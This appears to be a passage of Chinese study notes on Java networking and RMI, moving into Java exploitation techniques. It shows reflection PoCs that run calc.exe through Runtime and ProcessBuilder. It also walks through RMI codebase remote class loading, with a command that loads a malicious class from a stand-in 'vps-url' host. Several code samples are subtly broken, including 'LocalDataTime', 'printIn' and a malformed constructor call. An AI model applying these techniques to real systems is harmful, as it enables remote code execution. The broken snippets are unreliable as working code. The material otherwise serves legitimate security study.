    String s = new String(packet.getData(), packet.getOffset(), packet.getLength(), StandardCharsets.UTF_8);
    // 发送数据:
    byte[] data = "ACK".getBytes(StandardCharsets.UTF_8);
    packet.setData(data);
    ds.send(packet);
}
```

接收UDP数据包之前先要准备缓冲区，并通过`DatagramPacket`实现接收

假设我们收取到的是一个`String`，那么，通过`DatagramPacket`返回的`packet.getOffset()`和`packet.getLength()`确定数据在缓冲区的起止位置

当服务器收到一个DatagramPacket后，通常必须立刻回复一个或多个UDP包，因为客户端地址在DatagramPacket中，每次收到的DatagramPacket可能是不同的客户端，如果不回复，客户端就收不到任何UDP包

Client

```java
DatagramSocket ds = new DatagramSocket();
ds.setSoTimeout(1000);
ds.connect(InetAddress.getByName("localhost"), 6666); // 连接指定服务器和端口
// 发送:
byte[] data = "Hello".getBytes();
DatagramPacket packet = new DatagramPacket(data, data.length);
ds.send(packet);
// 接收:
byte[] buffer = new byte[1024];
packet = new DatagramPacket(buffer, buffer.length);
ds.receive(packet);
String resp = new String(packet.getData(), packet.getOffset(), packet.getLength());
ds.disconnect();
```

这里的`connect`不是真连接，它是为了在客户端的`DatagramSocket`实例中保存服务器端的IP和端口号，确保这个`DatagramSocket`实例只能往指定的地址和端口发送UDP包，不能往其他地址和端口发送。这么做不是UDP的限制，而是Java内置了安全检查。

如果客户端希望向两个不同的服务器发送UDP包，那么它必须创建两个`DatagramSocket`实例。

后续的收发数据和服务器端是一致的。通常来说，客户端必须先发UDP包，因为客户端不发UDP包，服务器端就根本不知道客户端的地址和端口号。

`disconnect()`也不是真正地断开连接，它只是清除了客户端`DatagramSocket`实例记录的远程服务器地址和端口号，这样，`DatagramSocket`实例就可以连接另一个服务器端。

### HttpClient

```java
URL url = new URL("http://www.example.com/path/to/target?a=1&b=2");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("GET");
conn.setUseCaches(false);
conn.setConnectTimeout(5000); // 请求超时5秒
// 设置HTTP头:
conn.setRequestProperty("Accept", "*/*");
conn.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)");
// 连接并发送HTTP请求:
conn.connect();
// 判断HTTP响应是否200:
if (conn.getResponseCode() != 200) {
    throw new RuntimeException("bad response");
}
// 获取所有响应Header:
Map<String, List<String>> map = conn.getHeaderFields();
for (String key : map.keySet()) {
    System.out.println(key + ": " + map.get(key));
}
// 获取响应内容:
InputStream input = conn.getInputStream();
...
```

从Java 11开始，引入了新的`HttpClient`

```java
import java.net.URI;
import java.net.http.*;
import java.net.http.HttpClient.Version;
import java.time.Duration;
import java.util.*;

public class Main {
    // 全局HttpClient:
    static HttpClient httpClient = HttpClient.newBuilder().build();

    public static void main(String[] args) throws Exception {
        String url = "https://www.sina.com.cn/";
        HttpRequest request = HttpRequest.newBuilder(new URI(url))
            // 设置Header:
            .header("User-Agent", "Java HttpClient").header("Accept", "*/*")
            // 设置超时:
            .timeout(Duration.ofSeconds(5))
            // 设置版本:
            .version(Version.HTTP_2).build();
        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
        // HTTP允许重复的Header，因此一个Header可对应多个Value:
        Map<String, List<String>> headers = response.headers().map();
        for (String header : headers.keySet()) {
            System.out.println(header + ": " + headers.get(header).get(0));
        }
        System.out.println(response.body().substring(0, 1024) + "...");
    }
}
```

post

```java
String url = "http://www.example.com/login";
String body = "username=bob&password=123456";
HttpRequest request = HttpRequest.newBuilder(new URI(url))
    // 设置Header:
    .header("Accept", "*/*")
    .header("Content-Type", "application/x-www-form-urlencoded")
    // 设置超时:
    .timeout(Duration.ofSeconds(5))
    // 设置版本:
    .version(Version.HTTP_2)
    // 使用POST并设置Body:
    .POST(BodyPublishers.ofString(body, StandardCharsets.UTF_8)).build();
HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
String s = response.body();
```

### RMI

一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法

要实现RMI，服务器和客户端必须共享同一个接口interface，测试

```java
public interface WorldClock extends Remote {
    LocalDateTime getLocalDateTime(String zoneId) throws RemoteException;
}
```

此接口必须派生自`java.rmi.Remote`，并在每个方法声明抛出`RemoteException`

下一步是编写服务器的实现类，因为客户端请求的调用方法`getLocalDateTime()`最终会通过这个实现类返回结果

```java
public class WorldClockService implements WorldClock{
    @Override
    public LocalDataTime getLocalDateTime(String zoneId) throws RemoteException{
        return LocalDataTime.now(ZoneId.of(zoneId)).withNano(0);
    }
}
```

现在需要通过Java RMI提供的一系列底层支持接口，把上面编写的服务以RMI的形式暴露在网络上，客户端才能调用

```java
public class Server {
    public static void main(String[] args) throws RemoteException {
        System.out.println("create World clock remote service...");
        // 实例化一个WorldClock:
        WorldClock worldClock = new WorldClockService();
        // 将此服务转换为远程服务接口:
        WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0);
        // 将RMI服务注册到1099端口:
        Registry registry = LocateRegistry.createRegistry(1099);
        // 注册此服务，服务名为"WorldClock":
        registry.rebind("WorldClock", skeleton);
    }
}
```

由于RMI要求服务器和客户端共享同一个接口，因此我们要把`WorldClock.java`这个接口文件复制到客户端，然后在客户端实现RMI调用

```java
public class Client {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        // 连接到服务器localhost，端口1099:
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // 查找名称为"WorldClock"的服务并强制转型为WorldClock接口:
        WorldClock worldClock = (WorldClock) registry.lookup("WorldClock");
        // 正常调用接口方法:
        LocalDateTime now = worldClock.getLocalDateTime("Asia/Shanghai");
        // 打印调用结果:
        System.out.println(now);
    }
}
```

对客户端来说，客户端持有的`WorldClock`接口实际上对应了一个“实现类”，它是由`Registry`内部动态生成的，并负责把方法调用通过网络传递到服务器端。而服务器端接收网络调用的服务并不是我们自己编写的`WorldClockService`，而是`Registry`自动生成的代码。我们把客户端的“实现类”称为`stub`，而服务器端的网络服务类称为`skeleton`，它会真正调用服务器端的`WorldClockService`，获取结果，然后把结果通过网络传递给客户端

RMI通过自动生成stub和skeleton实现网络调用，客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务

整个过程由RMI底层负责实现序列化和反序列化，很容易产生安全问题

## 反射安全

关于反射，p牛给出了这样的定义

> 一段代码，改变其中的变量，将会导致这段代码产生功能性的变化

可以联想到PHP的一句话🐎

### forName

获取一个`class`的`Class`实例的方式之一是`Class.forName`，它有两个函数重载

```java
Class<?> forName(String name)	// 常用
Class<?> forName(String name, **boolean** initialize, ClassLoader loader)
```

第三个参数`ClassLoader`的作用是告诉JVM如何加载这个类，java默认的`ClassLoader`就是根据类名（类完整路径）来加载类

对于第二个参数，即使我们设置`true`，也不会在执行`forName`时执行构造函数，这里的`initialize`指的是类的初始化，调用其中的`static`部分代码

- 类的实例化：static{} -> {} -> 构造函数

- 类的初始化：static{}

由此，如果`forName`的参数可控，我们可以编写恶意类（恶意代码位于static中），进而执行；编写poc

```java
package ref;

public class victim {
    public static void main(String[] args) throws Exception{
        String name = "ref.exp";
        Class.forName(name);
    }
}
```

```java
package ref;

public class exp {
    static {
        try{
            Runtime rt = Runtime.getRuntime();
            String[] cmd = {"calc.exe"};
            Process ps = rt.exec(cmd);
            ps.waitFor();
        }catch (Exception e){
            System.out.println("error here");
        }
    }
}
```

### getMethod&getDeclaredMethod

`Class.newInstance`调用的是该类的public无参构造函数，而有参数的构造方法 或非`public`的构造方法都无法通过`Class.newInstance()`调用，比如`Runtime`的构造方法就是私有的（单例模式

```java
Class cls = Class.forName("java.lang.Runtime");
cls.getMethod("exec", String.class).invoke(cls.newInstance(), "calc.exe");
```

我们可以通过`Runtime.getRuntime`获取到`Runtime`对象，这里指定的重载为最简单的`exec`

```java
Class cls = Class.forName("java.lang.Runtime");
cls.getMethod("exec", String.class).invoke(cls.getMethod("getRuntime").invoke(cls), "calc.exe");
```

另一个API是`getDeclaredMethod`，获取当前类声明的所有方法（不包括从父类继承来的方法

结合这一点，我们也可以这样弹计算器

```java
Class cls = Class.forName("java.lang.Runtime");
Constructor m = cls.getDeclaredConstructor();
m.setAccessible(true);
cls.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");
```

必须同时设置`setAccessible(true)`

### getConstructor

当一个类没有public的无参构造方法时，我们首先用`getConstructor`获取到构造函数，再用`newInstance`执行

```java
Class cls = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder) cls.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
```

如果目标环境没有强制类型转换时，我们可以再次借助反射

```java
Class cls = Class.forName("java.lang.ProcessBuilder"); cls.getMethod("start").invoke(cls.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

先获取到`start`方法，然后`invoke`执行，invoke 的第一个参数就是ProcessBuilder Object

如果要使用ProcessBuilder的另一个重载（参数为可变长参数），可以这样

```java
Class cls = Class.forName("java.lang.ProcessBuilder");
((ProcessBuilder) cls.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}})).start();
```

## RMI

即Remote Method Invocation，不让它RCE都对不起这个R

### 通信实现

Server编写实现类并注册为服务createRegistry，Client查找服务并获得接口实例getRegistry，两者共享相同的接口interface

当Client连接时，首先连接Registry并寻找想要的对象，发送Call消息；之后Server返回对象（序列化数据），ReturnData消息；Client收到后反序列化得到远程对象，与其建立TCP连接，在这个新的连接中才会在Server端执行方法调用

可以直接通过rmi://xxx:xxx/这样的地址获取所有绑定的对象（直通RMI Registry后台

```java
String[] s = Naming.list("rmi://ip:port");
```

对于rebind, bind, unbind这样的危险方法只有当来源是locahost才行，远程用不了

对于反序列化数据，可以用[SerializationDumper](https://github.com/NickstaDB/SerializationDumper/releases/)进行分析

### codebase to RCE

codebase是类似CLASSPATH的一个地址，告知JVM去哪里搜索类，常用于http, ftp这样的情况

在RMI通信过程中，反序列化对象时寻找类时先在自己的CLASSPATH下寻找，如果本地找不到就回去远程加载codebase中的类

如果codebase可控，再满足以下条件，就可以加载恶意类了：

- 安装并配置了SecurityManager
- Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false

java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置，值由false改为了true；在为true的情况下JVM只信任预先配置好的codebase，不支持从RMI中获取

```java
// Icalc.java
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface ICalc extends Remote {
    public Integer sum(List<Integer> params)throws RemoteException;
}

// Calc.java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.List;

public class Calc extends UnicastRemoteObject implements ICalc {
    public Calc() throws RemoteException{};
    public Integer sum(List<Integer> params) throws RemoteException{
        Integer sum = 0;
        for(Integer param: params){
            sum += param;
        }
        return sum;
    }
}

// RemoteRMIServer.java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RemoteRMIServer {
    private void start() throws Exception{
        if(System.getSecurityManager() == null){
            System.out.println("Setup SecurityManager");
            System.setSecurityManager(new SecurityManager());
        }
        Calc h = new Calc();
        LocateRegistry.createRegistry(6457);
        Naming.rebind("refObj", h);
    }

    public static void main(String[] args) throws Exception{
        new RemoteRMIServer().start();
    }
}

// client.java.policy
grant {
permission java.security.AllPermission;
};
```

注意配置命令行参数

```bash
java -Djava.rmi.server.hostname=192.168.31.175 -Djava.rmi.server.useCodebaseOnly=false -Djava.sec
urity.policy=client.policy RemoteRMIServer
```

但是还是会出现报错，java.lang.ClassNotFoundException或者java.security.AccessControlException: access denied（policy文件也传入了呀），搜了很多都没解决问题（真的搜了很多 但是都不行），先搁置了

```java
// RMIClient.java
import java.rmi.Naming;
import java.util.List;
import java.util.ArrayList;
import java.io.Serializable;

public class RMIClient implements Serializable{
	public class Payload extends ArrayList<Integer>{}
	public void lookup() throws Exception{
		ICalc r = (ICalc) Naming.lookup("rmi://ip:port/refObj");
		List<Integer> li = new Payload();
		li.add(3);
		li.add(4);
		System.out.printIn(r.sum(li));
	}
	public static void main(String[] args) throws Exception{
		new RMIClient.lookup();
	}
}
```

```bash
java -Djava.rmi.server.useCodebaseOnly=false -
Djava.rmi.server.codebase=http://vps-url/ RMIClient
```

利用的话将class放在Web服务器的 /RMIClient$Payload.class即可

codebase通过过`[Ljava.rmi.server.ObjID;`的`classAnnotations`（由`annotateClass`方法写入）传递，所以即使我们没有RMI客户端，只要修改`classAnnotations`的值就可以控制codebase，指向我们的网站

------

其它的语法等遇到了再学，估计还会有个Java语法补全下篇（如果我不懒的话
